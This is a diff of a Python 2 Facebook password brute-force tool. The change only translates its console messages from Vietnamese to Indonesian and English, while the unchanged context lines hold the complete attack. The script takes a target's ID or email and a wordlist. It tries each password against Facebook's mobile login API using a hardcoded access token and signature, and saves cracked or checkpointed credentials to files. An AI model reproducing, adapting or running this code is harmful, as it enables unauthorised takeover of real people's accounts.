@@ -27,7 +27,7 @@ def ceknet():
     try:
     	os.system('reset')
         print internet
-        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mKiểm tra kết nối internet...!'
+        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet'
         time.sleep(2)
         toolbar_width = 25
         sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
@@ -42,12 +42,12 @@ def ceknet():
         try:
             rq = requests.get('http://facebook.com')
             time.sleep(3.5)
-            print '\033[37;1m] \033[35;1m~> \033[32;1mThành Công...! '
+            print '\033[37;1m] \033[35;1m~> \033[32;1mSucces '
             time.sleep(2.0)
             start()
         except requests.exceptions.ConnectionError:
             time.sleep(3.5)
-            print '\033[37;1m]\033[35;1m ~>\033[31;1m Không có kết nối internet...!'
+            print '\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi'
             time.sleep(1.5)
             sys.exit()
 
@@ -59,20 +59,20 @@ def start():
         try:
             os.system('reset')
             print banner
-            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Nhập ID \033[36;1mhoặc \033[37;1mEmail\033[36;1m  \033[37;1m \033[31;1m: \033[32;1m')
-            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Nhập File Thư viện (cotcot.txt)   \033[31;1m:\033[32;1m ')
+            email = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
+            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
             total = open(passw, 'r')
             total = total.readlines()
-            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mNạn Nhân\033[36;1m :\033[32;1m ' + email
+            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
             time.sleep(3.0)
-            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTổng Số File \033[36;1m:\033[32;1m ' + str(len(total))
+            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total))
             time.sleep(3.0)
             print
             sandi = open(passw, 'r')
             for pw in sandi:
                 try:
                     pw = pw.replace('\n', '')
-                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Tấn Công...! \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
+                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                     sys.stdout.flush()
                     data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     mpsh = json.loads(data.text)
@@ -81,11 +81,11 @@ def start():
                         dapat.write('[ID]=> ' + email + '\n')
                         dapat.write('[PW]=> ' + pw)
                         dapat.close()
-                        print '\n\n\033[32;1m[+] \033[37;1mTìm Mật Khẩu.'
-                        print '\033[32;1m[+] \033[37;1mTài Khoản \033[32;1m: \033[35;1m'+email
-                        print '\033[32;1m[+] \033[37;1mMật Khẩu \033[32;1m:\033[35;1m '+pw
-                        print '\033[32;1m[+] \033[37;1mTrạng Thái   \033[32;1m:\033[32;1m Thành Công...!'
-                        print '\033[32;1m[=] \033[37;1mKết Thúc Chương Trình...!'
+                        print '\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND'
+                        print '\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
+                        print '\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
+                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES'
+                        print '\033[32;1m[=] \033[37;1mProgram Finish'
                         sys.exit()
                     else:
                         if 'www.facebook.com' in mpsh['error_msg']:
@@ -93,19 +93,19 @@ def start():
                             ceks.write('[ID]=> ' + email + '\n')
                             ceks.write('[PW]=> ' + pw)
                             ceks.close()
-                            print '\n\n\033[33;1m[+] \033[37;1mTìm Mật Khẩu.'
-                            print '\033[33;1m[+] \033[37;1mTài Khoản \033[32;1m: \033[35;1m'+email
-                            print '\033[33;1m[+] \033[37;1mMật Khẩu \033[32;1m:\033[35;1m '+pw
-                            print '\033[33;1m[+] \033[37;1mTrạng Thái  \033[32;1m:\033[33;1m Đang Kiển Tra...!'
-                            print '\033[33;1m[=] \033[37;1mKết Thúc Chương Trình...!'
+                            print '\n\n\033[33;1m[+] \033[37;1mPASSWORD FOUND'
+                            print '\033[33;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email
+                            print '\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw
+                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m CHEKPOINT'
+                            print '\033[33;1m[=] \033[37;1mProgram Finish'
                             sys.exit()
                 except requests.exceptions.ConnectionError:
-                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mLỗi Kết Nối..!'
+                    print '\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error'
                     sys.exit()
 
         except IOError:
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mĐịa chỉ thư viện không tồn tại'
-            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mTự thân vận động...!'
+            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada'
+            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri'
             sys.exit()
 
 ceknet()
